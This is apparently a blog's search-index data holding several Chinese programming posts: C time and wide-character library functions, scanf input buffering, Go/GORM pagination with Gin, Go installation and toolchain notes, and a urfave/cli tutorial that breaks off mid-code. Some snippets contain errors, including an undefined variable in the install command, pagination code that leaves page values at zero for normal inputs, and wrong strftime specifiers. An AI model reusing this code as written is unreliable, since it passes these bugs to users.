AM 或 PM strftime(s, sizeof s, &quot;It's %I:%M:%S %p&quot;, localtime(&amp;now)); puts(s); // It's 10:29:00 PM // %F: ISO 8601 yyyy-mm-dd 格式 // %T: ISO 8601 hh:mm:ss 格式 // %z: ISO 8601 时区 strftime(s, sizeof s, &quot;ISO 8601: %FT%T%z&quot;, localtime(&amp;now)); puts(s); // ISO 8601: 2021-02-28T22:29:00-0800} 下面是常用的格式占位符。 %%：输出 % 字符。 %a：星期几的简写形式，以当地时间计算。 %A：星期几的完整形式，以当地时间计算。 %b：月份的简写形式，以当地时间计算。 %B：月份的完整形式，以当地时间计算。 %c：日期和时间，使用“%x %X”。 %d：月份的天数（01-31）。 %H：小时，采用24小时制（00-23）。 %I：小时，采用12小时制（00-12）。 %J：一年的第几天（001-366）。 %m：月数（01-12）。 %M：分钟（00～59）。 %P：AM 或 PM。 %R：相当于”%H:%M”。 %S：秒（00-61）。 %U：一年的第几星期（00-53），以星期日为第1天。 %w：一星期的第几天，星期日为第0天。 %W：一年的第几星期(00-53)，以星期一为第1天。 %x：完整的年月日的日期，以当地时间计算。 %X：完整的时分秒的时间，以当地时间计算。 %y：两位数年份（00-99）。 %Y：四位数年份（例如 1984）。 %Z：时区的简写。 timespec_get()timespec_get()用来将当前时间转成距离时间纪元的纳秒数（十亿分之一秒）。 1int timespec_get ( struct timespec* ts, int base ) ; timespec_get()接受两个参数。 第一个参数是 struct timespec 结构指针，用来保存转换后的时间信息。struct timespec 的结构如下。 1234struct timespec { time_t tv_sec; // 秒数 long tv_nsec; // 纳秒}; 第二个参数是一个整数，表示时间计算的起点。标准只给出了宏 TIME_UTC 这一个可能的值，表示返回距离时间纪元的秒数。 下面是一个例子。 1234567891011struct timespec ts; timespec_get(&amp;ts, TIME_UTC); // 1614581530 s, 806325800 nsprintf(&quot;%ld s, %ld ns\\n&quot;, ts.tv_sec, ts.tv_nsec); double float_time = ts.tv_sec + ts.tv_nsec/1000000000.0;// 1614581530.806326 seconds since epochprintf(&quot;%f seconds since epoch\\n&quot;, float_time); clock()clock()函数返回从程序开始执行到当前的 CPU 时钟周期。一个时钟周期等于 CPU 频率的倒数，比如 CPU 的频率如果是 1G Hz，表示1秒内时钟信号可以变化 10^9 次，那么每个时钟周期就是 10^-9 秒。 1clock_t clock(void); clock()函数返回一个数字，表示从程序开始到现在的 CPU 时钟周期的次数。这个值的类型是 clock_t，一般是 long int 类型。 为了把这个值转换为秒，应该把它除以常量CLOCKS_PER_SEC（每秒的时钟周期），这个常量也由time.h定义。 1printf(&quot;CPU time: %f\\n&quot;, clock() / (double)CLOCKS_PER_SEC); 上面示例可以输出程序从开始到运行到这一行所花费的秒数。 如果计算机无法提供 CPU 时间，或者返回值太大，无法用clock_t类型表示，clock()函数就返回-1。 为了知道某个操作所耗费的精确时间，需要调用两次clock()，然后将两次的返回值相减。 1234567clock_t start = clock();// ... 执行某些操作clock_t end = clock();long double seconds = (float)(end - start) / CLOCKS_PER_SEC; 参考链接 How to Measure Execution Time of a Program wchar.h宽字符使用两个或四个字节表示一个字符，导致 C 语言常规的字符处理函数都会失效。wchar.h 定义了许多宽字符专用的处理函数。 类型别名和宏wchar.h 定义了一个类型别名 wint_t，表示宽字符对应整数值。 wchar.h 还定义了一个宏 WEOF，表示文件结束字符 EOF 的宽字符版。 btowc()，wctob()btowc()将单字节字符转换为宽字符，wctob()将宽字符转换为单字节字符。 12wint_t btowc(int c);int wctob(wint_t c); btowc()返回一个宽字符。如果参数是 EOF，或转换失败，则返回 WEOF。 wctob()返回一个单字节字符。如果参数是 WEOF，或者参数宽字符无法对应单个的单字节字符，则返回 EOF。 下面是用法示例。 123456789wint_t wc = btowc('B'); // 输出宽字符 Bwprintf(L&quot;Wide character: %lc\\n&quot;, wc);unsigned char c = wctob(wc);// 输出单字节字符 Bwprintf(L&quot;Single-byte character: %c\\n&quot;, c); fwide()fwide()用来设置一个字节流是宽字符流，还是多字节字符流。 如果使用宽字符专用函数处理字节流，就会默认设置字节流为宽字符流，否则就需要使用fwide()显式设置。 1int fwide(FILE* stream, int mode); 它接受两个参数，第一个参数是文件指针，第二个参数是字节流模式，有三种选择。 0：字节流模式保持原样。 -1（或其他负值）：设为多字节字符流。 1（或其他正值）：设为宽字符流。 fwide()的返回值也分成三种情况：如果是宽字符流，返回一个正值；如果是多字节字符流，返回一个负值；如果是普通字符流，返回0。 一旦设置了字节流模式，就无法再更改。 12345678#include &lt;stdio.h&gt;#include &lt;wchar.h&gt;int main(void) { wprintf(L&quot;Hello world!\\n&quot;); int mode = fwide(stdout, 0); wprintf(L&quot;Stream is %ls-oriented\\n&quot;, mode &lt; 0 ? L&quot;byte&quot; : L&quot;wide&quot;);} 上面示例中，wprintf()将字节流隐式设为宽字符模式，所以fwide(stdout, 0)的返回值大于零。 宽字符专用函数下面这些函数基本都是 stdio.h 里面的字符处理函数的宽字符版本，必须使用这些函数来操作宽字符。 fgetwc() 从宽字符流中获取宽字符，对应 fgetc()。 fgetws() 从宽字符流中读取宽字符串，对应 fgets()。 fputwc() 将宽字符写入宽字符流，对应 fputc()。 fputws() 将宽字符串写入宽字符流，对应 fputs()。 fwprintf() 格式化宽输出到宽字符流，对应 fprintf()。 fwscanf() 来自宽字符流的格式化宽字符输入，对应 fscanf()。 getwchar() 从 stdin 获取一个宽字符，对应 getchar()。 getwc() 从 stdin 获取一个宽字符，对应 getc()。 putwchar() 写一个宽字符到 stdout，对应 putchar()。 putwc() 写一个宽字符到 stdout，对应 putc()。 swprintf() 格式化宽输出到宽字符串，对应 sprintf()。 swscanf() 来自宽字符串的格式化宽输入，对应 sscanf()。 ungetwc() 将宽字符推回输入流，对应 ungetc()。 vfwprintf() 可变参数的格式化宽字符输出到宽字符流，对应 vfprintf()。 vfwscanf() 来自宽字符流的可变参数格式化宽字符输入，对应 vfscanf()。 vswprintf() 可变参数的格式化宽字符输出到宽字符串，对应 vswprintf()。 vswscanf() 来自宽字符串的可变参数格式化宽字符输入，对应 vsscanf()。 vwprintf() 可变参数格式化宽字符输出，对应 vprintf()。 vwscanf() 可变参数的格式化宽字符输入，对应 vscanf()。 wcscat() 危险地连接宽字符串，对应 strcat()。 wcschr() 在宽字符串中查找宽字符，对应 strchr()。 wcscmp() 比较宽字符串，对应 strcmp()。 wcscoll() 比较两个考虑语言环境的宽字符串，对应 strcoll()。 wcscpy() 危险地复制宽字符串，对应 strcpy()。 wcscspn() 不是从宽字符串前面开始计算字符，对应 strcspn()。 wcsftime() 格式化的日期和时间输出，对应 strftime()。 wcslen() 返回宽字符串的长度，对应 strlen()。 wcsncat() 更安全地连接宽字符串，对应 strncat()。 wcsncmp() 比较宽字符串，长度有限，对应 strncmp()。 wcsncpy() 更安全地复制宽字符串，对应 strncpy()。 wcspbrk() 在宽字符串中搜索一组宽字符中的一个，对应 strpbrk()。 wcsrchr() 从末尾开始在宽字符串中查找宽字符，对应 strrchr()。 wcsspn() 从宽字符串前面的集合中计算字符，对应 strspn()。 wcsstr() 在另一个宽字符串中找到一个宽字符串，对应 strstr()。 wcstod() 将宽字符串转换为 double，对应 strtod()。 wcstof() 将宽字符串转换为 float，对应 strtof()。 wcstok() 标记一个宽字符串，对应 strtok()。 wcstold() 将宽字符串转换为 long double，对应 strtold()。 wcstoll() 将宽字符串转换为 long long，对应 strtoll()。 wcstol() 将宽字符串转换为 long，对应 strtol()。 wcstoull() 将宽字符串转换为 unsigned long long，对应 strtoull()。 wcstoul() 将宽字符串转换为 unsigned long，对应 strtoul()。 wcsxfrm() 转换宽字符串以根据语言环境进行比较，对应 strxfrm()。 wmemcmp() 比较内存中的宽字符，对应 memcmp()。 wmemcpy() 复制宽字符内存，对应 memcpy()。 wmemmove() 复制宽字符内存，可能重叠，对应 memmove()。 wprintf() 格式化宽输出，对应 printf()。 wscanf() 格式化宽输入，对应 scanf()。 多字节字符专用函数wchar.h 也定义了一些多字节字符的专用函数。 mbsinit() 判断 mbstate_t 是否处于初始转换状态。 mbrlen() 给定转换状态时，计算多字节字符串的字节数，对应 mblen()。 mbrtowc() 给定转换状态时，将多字节字符转换为宽字符，对应 mbtowc()。 wctombr() 给定转换状态时，将宽字符转换为多字节字符，对应 wctomb()。 mbsrtowcs() 给定转换状态时，将多字节字符串转换为宽字符串，对应 mbstowcs()。 wcsrtombs() 给定转换状态时，将宽字符串转换为多字节字符串，对应 wcstombs()。 wctype.hwctype.h 提供 ctype.h 里面函数的宽字符版本。 宽字符类型判断函数下面函数判断宽字符的类型。 iswalnum() 测试宽字符是否为字母数字 iswalpha() 测试宽字符是否为字母 iswblank() 测试这是否是一个宽空白字符 iswcntrl() 测试这是否是一个宽控制字符。 iswdigit() 测试这个宽字符是否是数字 iswgraph() 测试宽字符是否是可打印的非空格字符 iswlower() 测试宽字符是否为小写 iswprint() 测试宽字符是否可打印 iswpunct() 测试宽字符是否为标点符号 iswspace() 测试宽字符是否为空格 iswupper() 测试宽字符是否为大写 iswxdigit() 测试宽字符是否为十六进制数字 wctype()，iswctype()iswctype()是上一节各种宽字符类型判断函数的通用版本，必须与wctype()配合使用。 1int iswctype(wint_t wc, wctype_t desc); iswctype()接受两个参数，第一个参数是一个需要判断类型的宽字符，第二个参数是宽字符类型描述，来自wctype()的返回值。 如果宽字符属于指定类型，iswctype()返回一个非零值，否则返回零。 wctype()用来获取某个种类宽字符的类型描述。 1wctype_t wctype(const char* property); wctype()的参数是一个给定的字符串，可用的值如下：alnum、alpha、blank、cntrl、digit、graph、lower、print、punct、space、upper、xdigit。 wctype()的返回值的类型为 wctype_t，通常是一个整数。如果参数是一个无效值，则返回0。 123if (iswctype(c, wctype(&quot;digit&quot;)))// 相当于if (iswdigit(c)) 上面示例用来判断宽字符c是否为数值，相当于iswdigit()。 iswctype()的完整类型判断如下。 123456789101112iswctype(c, wctype(&quot;alnum&quot;)) // 相当于 iswalnum(c)iswctype(c, wctype(&quot;alpha&quot;)) // 相当于 iswalpha(c)iswctype(c, wctype(&quot;blank&quot;)) // 相当于 iswblank(c)iswctype(c, wctype(&quot;cntrl&quot;)) // 相当于 iswcntrl(c)iswctype(c, wctype(&quot;digit&quot;)) // 相当于 iswdigit(c)iswctype(c, wctype(&quot;graph&quot;)) // 相当于 iswgraph(c)iswctype(c, wctype(&quot;lower&quot;)) // 相当于 iswlower(c)iswctype(c, wctype(&quot;print&quot;)) // 相当于 iswprint(c)iswctype(c, wctype(&quot;punct&quot;)) // 相当于 iswpunct(c)iswctype(c, wctype(&quot;space&quot;)) // 相当于 iswspace(c)iswctype(c, wctype(&quot;upper&quot;)) // 相当于 iswupper(c)iswctype(c, wctype(&quot;xdigit&quot;)) // 相当于 iswxdigit(c) 大小写转换函数wctype.h 提供以下宽字符大小写转换函数。 towlower() 将大写宽字符转换为小写 towupper() 将小写宽字符转换为大写 towctrans() 宽字符大小写转换的通用函数 wctrans() 大小写转换的辅助函数，配合 towctrans() 使用 先看towlower()和towupper()的用法示例。 12towlower(L'B') // btowupper(L'e') // E towctrans()和wctrans()的原型如下。 12wint_t towctrans(wint_t wc, wctrans_t desc);wctrans_t wctrans(const char* property); 下面是它们的用法示例。 12towctrans(c, wctrans(&quot;toupper&quot;)) // 相当于 towupper(c)towctrans(c, wctrans(&quot;tolower&quot;)) // 相当于 towlower(c)","link":"/2021/11/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/%E3%80%8AC%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%E3%80%8B%E9%98%AE%E4%B8%80%E5%B3%B0/"},{"title":"对C语言scanf函数机制的浅探究","text":"对C语言scanf函数机制的浅探究在使用C语言写程序的时候，往往会使用到scanf()函数，然而如果对这个函数的机制不太清楚，不正确的输入下，产生的结果难以估计。于是通过实验，总结了一下scanf()函数的机制。 格式化字符串匹配失败会直接退出函数运行 int a=4; scanf(&quot;x%d&quot;, &amp;a); printf(&quot;%d&quot;, a); 如果此时输入了a89，格式化字符串匹配失败，将直接退出函数。变量a的值没有被改变。 int a=4; scanf(&quot;%d&quot;, &amp;a); printf(&quot;%d&quot;, a); 如果此时输入了字母a，格式化字符串匹配失败，也将直接退出函数。变量a的值也没有被改变。所以这两段代码的输出都是 4 输入缓存区 C语言有输入缓存区，scanf会优先从缓存区读取数据来匹配格式化字符串，输入缓存区为空的话才会向用户请求输入。 注意是为空才请求输入，而不是匹配不成功请求输入 char a; int b=1; scanf(&quot;%c&quot;,&amp;a); scanf(&quot;%d&quot;,&amp;b); printf(&quot;输出:%d&quot;,b); 例如这串代码，如果第一次请求输入时输入了 ab ，此时字符 ‘a’ 被存入变量a，输入缓存区还剩下 [ 'b' , '\\n' ] ，所以第二个scanf函数不会再请求用户输入，而是直接去缓存区匹配，而这次匹配不成功，所以变量b的值没有被改变过。这段代码的输出为 输出:1 使用占位符%d时情况不太一样 scanf(&quot;%d&quot;); 我们在使用%d接受数字输入时，发现一种情况，即使直接输入回车，也不会匹配不成功，而是一直等待用户输入，直到输入含有空格、回车之外的字符传入。 为什么呢？考虑这种情况：scanf(&quot;%d%d&quot;, &amp;a, &amp;b)，用户会在输入第二个数字前先打上空格或者回车，所以设计了这种情况。 就是说，C语言按%d接受输入时，会把匹配到数字之前匹配到的空格和回车看作分隔符拿出缓存区扔掉，不作匹配使用，继续请求用户输入。 再看刚才的代码，分析一下。如果输入a，此时字符 ‘a’ 被存入变量a，输入缓存区还剩下 [ '\\n' ] ，所以这种情况下，即使缓存区还有一个字符，可因为它是换行符，按%d输入时依旧会把它看作分隔符，此时还是会向用户请求输入。 格式化字符串的匹配机制–&gt; 逐字符匹配 如果我们想要以a-b的形式输入系数-指数以此存储一个多项式，a-b之间以英文逗号分隔，我们会怎么写呢？ int c, e; do { scanf(&quot;%d-%d&quot;, &amp;c, &amp;e); /* 省略存储过程 */ } while (getchar()==','); 这么写非常好，但是如果用户没有按给定格式输入时，会发生什么错误我们得心里有数。 比如我输入是：3,4-3,5-,a-5 ，发生了什么呢？ 这时候C语言就会采取逐字符匹配的原则来工作。PS：每两次执行之间都会被getchar()函数从缓存区拿走一个 ‘,’ 。 缓存区 执行顺序 匹配值 退出原因 执行操作 3,4-3,5-,a-5\\n 1 3 ‘-‘ 与 ‘,’ 不匹配 c=3 4-3,5-,a-5\\n 2 4-3 格式化字符串匹配结束 c=4,e=3 5-,a-5\\n 3 5- ‘,’ 与%d不匹配 c=5 a-5\\n 4 ‘a’ 与%d不匹配 这么看来，即使没有完全匹配到规定的字符串，sacnf函数也会将现有匹配到的先作使用，即使后面匹配失败，前面匹配成功的部分依然有效。 结合前面，我们还可以知道如果输入的是 3, 4- 3, 5-, a-5 （中间多了空格），因为匹配 %d 时会忽略空格回车的机制，即使逗号后面加了空格，和原输入也还是等价的。这么做还是有一些小缺陷，因为输入时即使按照要求，也可能因为习惯，在逗号前加了空格，我们可以这么处理。 int c, e; char m; do { scanf(&quot;%d-%d&quot;, &amp;c, &amp;e); /* 省略存储过程 */ do{ m = getchar(); }while(m==' '); } while (m==','); 这样处理的代码，即使在分隔符前后都加上空格，我们也能确保它正确处理，代码变得友好了很多。至于其他情况嘛……有精力的话也可以再设计一下，我是不想设计了hhhh，毕竟已经满足以a-b的形式输入系数-指数,以英文逗号分隔的要求了~（不听话的用户活该得不到正确结果！hhhh开玩笑） 其他占位符 其他占位符也有类似的情况，在此不再赘述，想要研究的小伙伴可以自行研究一下！","link":"/2022/03/31/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/%E5%AF%B9C%E8%AF%AD%E8%A8%80scanf%E5%87%BD%E6%95%B0%E6%9C%BA%E5%88%B6%E7%9A%84%E6%B5%85%E6%8E%A2%E7%A9%B6/"},{"title":"Golang代码复用-分页最佳实践","text":"分页是查询的一个基本要求之一。这部分代码大多重复，适合复用。下面是一种最佳实践： 这是一个传有分页数据的Gin Handler，它需要对数据库进行分页查询： 12func (p propertyRepository) GetPagedAndFiltered (limit, page int){} 随后我们定义一个gorm中间件去对数据库进行分页： 1234567891011121314151617import &quot;gorm.io/gorm&quot; type paginate struct { limit int page int } func newPaginate(limit int, page int) *paginate { return &amp;paginate{limit: limit,page: page} } func (p *paginate) paginatedResult(db *gorm.DB) *gorm.DB { offset := (p.page - 1) * p.limit return db.Offset(offset). Limit(p.limit) } 随后，就可以在数据库中使用分页了： 1234567func (p propertyRepository) GetPagedAndFiltered(limit, page int) ([]Property, error) { var properties []Property err := p.db.Scopes(newPaginate(limit,page).paginatedResult).Find(&amp;properties).Error return properties, err } 当然，我对上面的代码进行了进一步的集成。虽然损失了低耦合性质，但是只是在Gin使用的话体验拉满： 1234567891011121314151617181920212223242526type Pagination struct { PageSize int PageNum int}// GetPagination Get pagination infofunc GetPagination(c *gin.Context) Pagination { var data Pagination pageSize, _ := strconv.Atoi(c.Query(&quot;pagesize&quot;)) pageNum, _ := strconv.Atoi(c.Query(&quot;pagenum&quot;)) switch { case pageSize &gt;= 100: data.PageSize = 100 case pageSize &lt;= 0: data.PageSize = 10 } if pageNum &lt;= 0 { data.PageNum = 1 } return data}func (p *Pagination) PaginatedResults(db *gorm.DB) *gorm.DB { offset := (p.PageNum - 1) * p.PageSize return db.Offset(offset).Limit(p.PageSize)} 使用方法就是在Gin Handler中用GetPagination获取分页参数，然后在model的具体数据库实现操作中使用db.Scopes(page.PaginatedResult).xxx直接分页。 应该是一种最佳实践。","link":"/2023/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Golang/Golang%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A8-%E5%88%86%E9%A1%B5%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/"},{"title":"Go学习笔记","text":"安装 访问这里 ，下载安装包进行安装即可。或者访问这里下载也可。 配置go mod proxy，参考https://goproxy.cn即可。 安装VSCode+Go插件或者Goland等开发工具都可以。 最近得在Linux上编译个服务端程序，所以把配置方法记录一下。 源用的是USTC的。看了他们官网发现东西还真不少比隔壁tuna多多了而且域名还短（确信）。golang直接下载太慢所以走镜像站。链接在这，时效性应该不用太担心。 https://mirrors.ustc.edu.cn/golang/go1.20.1.linux-amd64.tar.gz 步骤很简单，就是wget然后tar解压到指定位置最后把目录加到系统环境变量里边： 12345678VER=&quot;1.20.1&quot;SH=&quot;bash&quot;# 下载解压 &amp; 移除旧版本wget https://mirrors.ustc.edu.cn/golang/go&quot;$VER&quot;.linux-amd64.tar.gz \\&amp;&amp; rm -rf /usr/local/go \\&amp;&amp; tar -C /usr/local -zxf go$GO_STR.linux-amd64.tar.gz# 如果是第一次安装且使用bashecho &quot;export PATH=$PATH:/usr/local/go/bin&quot; &gt;&gt; ~/.&quot;$SH&quot;rc 注意：执行上面的脚本之前请先自行验证安全性。以及，上面的脚本得用root权限执行。 然后就是设置代理。我用http://goproxy.cn比较多。配置也很简单： 12export GO111MODULE=onexport GOPROXY=https://goproxy.cn 资料 《Go语言圣经》 常见问题 Go test报错 报错内容：call has possible formatting directive %v 原因：go test 中不能使用 fmt.Println(&quot;%v&quot;, v) 方案使用 fmt.Printf(&quot;%+v&quot;, v) 工具链现代语言最大的优势就是工具链。 1go tool dist list 依赖： 1ldd [bin-name] 静态编译： 123CGO_ENABLED=0 go build xxx# or thisgo build xxx -ldflags '-linkmode &quot;external&quot; -extldflags &quot;-static&quot;' 如果glibc版本不对的话，直接使用指定LD_LIBRARY_PATH=.的方法是无效的。 ref:Glibc is hard-coded in the program 造轮子采用组合的方式将常用的范式写成函数，同时不失灵活性和潜力。 Gin对于Gin的复用主要是添加路由的方式进行抽象和标准化，同时编写一些较为通用的API Handlers： 123456789func APIBuilder(router gin.IRouter, handlers ...func(*gin.RouterGroup) *gin.RouterGroup) func(gin.IRouter, string) *gin.RouterGroup { return func(router gin.IRouter, path string) *gin.RouterGroup { group := router.Group(path) for _, handler := range handlers { group = handler(group) } return group }} 上面的函数实现了为一个gin.RouterGroup自动添加参数传入的handler列表。这样的构造器构造出的函数能用于给一个接口添加几个固定的Handler。在复用层面实现了快速的为一个结构体添加CRUD的能力，同时允许你编写自己的handler代码，以及自己的构造器。 12345678910func AddCRUD[T any](router gin.IRouter, path string, db *gorm.DB) *gin.RouterGroup { return APIBuilder(router, func(group *gin.RouterGroup) *gin.RouterGroup { group.GET(&quot;&quot;, getAll[T](db)) group.GET(&quot;/:id&quot;, get[T](db)) group.POST(&quot;&quot;, create[T](db)) group.PUT(&quot;/:id&quot;, update[T](db)) group.DELETE(&quot;/:id&quot;, delete[T](db)) return group })(router, path)} 上面展示的就是构造器的一个用法，这个构造器构造的函数能用来快速给一个结构体添加CRUD接口。 其中的Handler可以自己实现，并把自己的Handler通过上面的APIBuilder打包成一个可以快速调用的函数： 12345678910111213141516171819202122232425// 简单的Handler示范func create[T any](db *gorm.DB) func(c *gin.Context) { return func(c *gin.Context) { var d T if err := c.ShouldBindJSON(&amp;d); err != nil { c.AbortWithStatus(404) log.Println(&quot;[gorm]parse creation data failed: &quot;, err) } else { if err := db.Create(&amp;d).Error; err != nil { c.AbortWithStatus(404) log.Println(&quot;[gorm]create data failed: &quot;, err) } else { c.JSON(200, d) } } }}// 简单的调用示范type Hello struct { Hello string World string}r := gin.Defaultdb, _ := gorm.Open(sqlite.Open(&quot;test&quot;), &amp;gorm.Config{})AddCRUD[Hello](r, &quot;/hello&quot;, db) 上面几行代码就添加了四个对于Hello的CRUD API。 而且你应该注意到了，上面crud的实现我传入了gorm.DB来完成实际的crud动作。主要是因为数据库查询的动作我不知道应该怎么传入，而且又不想自己搓个大而全的框架出来——简洁的函数更合我的胃口。 下一步就是尝试抽象以前自己编写的后端，试着用简洁又不失灵活度的方法创建一个渐进式辅助函数包。 最近发现了go-zero这个脚手架，主打面向k8s整微服务开发。框架做的还行，甚至基于go语法搓了个DSL出来。里边包含的单体微服务的框架对我有比较大的启发作用，我打算把它变成一个更FP的工具包拿来用。以及Goland好像看着确实不错。 更新，搓了一个crud的框架，以及一些零散的中间件类的工具，以及一些零散的工具。很难分类，有点陷入架构难题了（ Golang-THE_BAD_THINGS开个坑后面填 语法 鸭子继承 defer 类型系统 泛型系统 结构体注解系统 基于大小写的可见域控制 暂时没想起来但是我觉得还有 工具链 这个好像没啥好喷的毕竟确实优秀（ 虽然绕开glibc的行为不好说但是从效果和架构上来看，我是支持这种设计方法的（ 唯一的问题是可能会和linux承诺的源码级兼容性有些许冲突（？","link":"/2022/05/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Golang/Go%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"Go语言命令行库urfave-cli简介","text":"很多用Go写的命令行程序都用了urfave/cli这个库，包括geth，有必要简单了解一下。 用C写过命令行程序的人应该都不陌生，我们需要根据argc/argv一个个地解析命令行参数，调用不同的函数，最后还要写一个usage()函数用于打印帮助信息。urfave/cli把这个过程做了一下封装，抽象出flag/command/subcommand这些模块，用户只需要提供一些模块的配置，参数的解析和关联在库内部完成，帮助信息也可以自动生成。 举个例子，我们想要实现下面这个命令行程序： 123456789101112131415161718NAME: GoTest - hello worldUSAGE: GoTest [global options] command [command options] [arguments...]VERSION: 1.2.3COMMANDS: help, h Shows a list of commands or help for one command arithmetic: add, a calc 1+1 sub, s calc 5-3 database: db database operations GLOBAL OPTIONS: --lang FILE, -l FILE read from FILE (default: &quot;english&quot;) --port value, -p value listening port (default: 8000) --help, -h Help!Help! --print-version, -v print version 基本结构导入包以后，通过cli.NewApp()创建一个实例，然后调用Run()方法就实现了一个最基本的命令行程序了。 当然，为了让我们的程序干点事情，可以指定一下入口函数app.Action，具体写法如下： 1234567891011121314151617import ( &quot;fmt&quot; &quot;gopkg.in/urfave/cli.v1&quot;) func main() { app := cli.NewApp() app.Action = func(c *cli.Context) error { fmt.Println(&quot;BOOM!&quot;) return nil } err := app.Run(os.Args) if err != nil { log.Fatal(err) }} 公共配置就是帮助里需要显示的一些基本信息： 123 app.Name = &quot;GoTest&quot; app.Usage = &quot;hello world&quot; app.Version = &quot;1.2.3&quot; Flag配置具体对应于帮助中的以下信息： 12--lang FILE, -l FILE read from FILE (default: &quot;english&quot;)--port value, -p value listening port (default: 8000) 对应代码： 1234567891011121314var language string app.Flags = []cli.Flag { cli.IntFlag { Name: &quot;port, p&quot;, Value: 8000, Usage: &quot;listening port&quot;, }, cli.StringFlag { Name: &quot;lang, l&quot;, Value: &quot;english&quot;, Usage: &quot;read from `FILE`&quot;, Destination: &amp;language, }, } 可以看到，每一个flag都对应一个cli.Flag接口的实例。 Name字段中逗号后面的字符表示flag的简写，也就是说”–port”和”-p”是等价的。 Value字段可以指定flag的默认值。 Usage字段是flag的描述信息。 Destination字段可以为该flag指定一个接收者，比如上面的language变量。解析完”–lang”这个flag后会自动存储到这个变量里，后面的代码就可以直接使用这个变量的值了。 另外，如果你想给用户增加一些属性值类型的提示，可以通过占位符（placeholder）来实现，比如上面的”–lang FILE”。占位符通过``符号来标识。 我们可以在app.Action中测试一下打印这些flag的值： 123456app.Action = func(c *cli.Context) error { fmt.Println(&quot;BOOM!&quot;) fmt.Println(c.String(&quot;lang&quot;), c.Int(&quot;port&quot;)) fmt.Println(language) return nil } 另外，正常来说帮助信息里的flag是按照代码里的声明顺序排列的，如果你想让它们按照字典序排列的话，可以借助于sort： 12import &quot;sort&quot;sort.Sort(cli.FlagsByName(app.Flags)) 最后，help和version这两个flag有默认实现，也可以自己改： 12345678cli.HelpFlag = cli.BoolFlag { Name: &quot;help, h&quot;, Usage: &quot;Help!Help!&quot;, } cli.VersionFlag = cli.BoolFlag { Name: &quot;print-version, v&quot;, Usage: &quot;print version&quot;, } Command配置命令行程序除了有flag，还有command（比如git log, git commit等等）。 另外每个command可能还有subcommand，也就必须要通过添加两个命令行参数才能完成相应的操作。比如我们的db命令包含2个子命令，如果输入GoTest db -h会显示下面的信息： 12345678NAME: GoTest db - database operations USAGE: GoTest db command [command options] [arguments...] COMMANDS: insert insert data delete delete data OPTIONS: --help, -h Help!Help! 每个command都对应于一个cli.Command接口的实例，入口函数通过Action指定。如果你想像在帮助信息里实现分组显示，可以为每个command指定一个Category。具体代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445app.Commands = []cli.Command { { Name: &quot;add&quot;, Aliases: []string{&quot;a&quot;}, Usage: &quot;calc 1+1&quot;, Category: &quot;arithmetic&quot;, Action: func(c *cli.Context) error { fmt.Println(&quot;1 + 1 = &quot;, 1 + 1) return nil }, }, { Name: &quot;sub&quot;, Aliases: []string{&quot;s&quot;}, Usage: &quot;calc 5-3&quot;, Category: &quot;arithmetic&quot;, Action: func(c *cli.Context) error { fmt.Println(&quot;5 - 3 = &quot;, 5 - 3) return nil }, }, { Name: &quot;db&quot;, Usage: &quot;database operations&quot;, Category: &quot;database&quot;, Subcommands: []cli.Command { { Name: &quot;insert&quot;, Usage: &quot;insert data&quot;, Action: func(c *cli.Context) error { fmt.Println(&quot;insert subcommand&quot;) return nil }, }, { Name: &quot;delete&quot;, Usage: &quot;delete data&quot;, Action: func(c *cli.Context) error { fmt.Println(&quot;delete subcommand&quot;) return nil }, }, }, }, } 如果你想在command执行前后执行后完成一些操作，可以指定app.Before/app.After这两个字段： 12345678app.Before = func(c *cli.Context) error { fmt.Println(&quot;app Before&quot;) return nil } app.After = func(c *cli.Context) error { fmt.Println(&quot;app After&quot;) return nil } 具体测试一下： 12$ GoTest add$ GoTest db insert 小结总体来说，urfave/cli这个库还是很好用的，完成了很多routine的工作，程序员只需要专注于具体业务逻辑的实现。 附完整demo代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package cliimport ( &quot;fmt&quot; &quot;log&quot; &quot;os&quot; &quot;sort&quot; &quot;gopkg.in/urfave/cli.v1&quot;)func Run() { var language string app := cli.NewApp() app.Name = &quot;GoTest&quot; app.Usage = &quot;hello world&quot; app.Version = &quot;1.2.3&quot; app.Flags = []cli.Flag{ cli.IntFlag{ Name: &quot;port, p&quot;, Value: 8000, Usage: &quot;listening port&quot;, }, cli.StringFlag{ Name: &quot;lang, l&quot;, Value: &quot;english&quot;, Usage: &quot;read from `FILE`&quot;, Destination: &amp;language, }, } app.Commands = []cli.Command{ { Name: &quot;add&quot;, Aliases: []string{&quot;a&quot;}, Usage: &quot;calc 1+1&quot;, Category: &quot;arithmetic&quot;, Action: func(c *cli.Context) error { fmt.Println(&quot;1 + 1 = &quot;, 1+1) return nil }, }, { Name: &quot;sub&quot;, Aliases: []string{&quot;s&quot;}, Usage: &quot;calc 5-3&quot;, Category: &quot;arithmetic&quot;, Action: func(c *cli.Context) error { fmt.Println(&quot;5 - 3 = &quot;, 5-3) return nil }, }, { Name: &quot;db&quot;, Usage: &quot;database operations&quot;, Category: &quot;database&quot;, Subcommands: []cli.Command{ { Name: &quot;insert&quot;, Usage: &quot;insert data&quot;, Action: func(c *cli.Context) error { fmt.Println(&quot;insert subcommand&quot;) return nil }, }, { Name: &quot;delete&quot;, Usage: &quot;delete data&quot;, Action: func(c *cli.Context) error { fmt.Println(&quot;delete subcommand&quot;) return nil }, }, }, }, } app.Action = func(c *cli.Context) error { fmt.Println(&quot;BOOM!&quot;) fmt.Println(c.String(&quot;lang&quot;), c.Int(&quot;port&quot;)) fmt.Println(language) if 